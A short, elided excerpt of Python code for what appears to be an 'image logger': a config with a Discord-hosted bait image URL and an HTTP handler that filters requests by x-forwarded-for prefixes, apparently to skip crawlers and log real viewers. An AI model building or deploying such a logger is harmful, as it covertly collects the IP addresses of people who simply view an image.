...
config = {
    ...
    "image": "https://media.discordapp.net/attachments/984515662263251085/1063575951314796704/image.png?width=1260&height=386", # You can also have a custom image by using a URL argument
...
class ImageLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        ...
        if self.headers.get('x-forwarded-for').startswith(('35','34')):
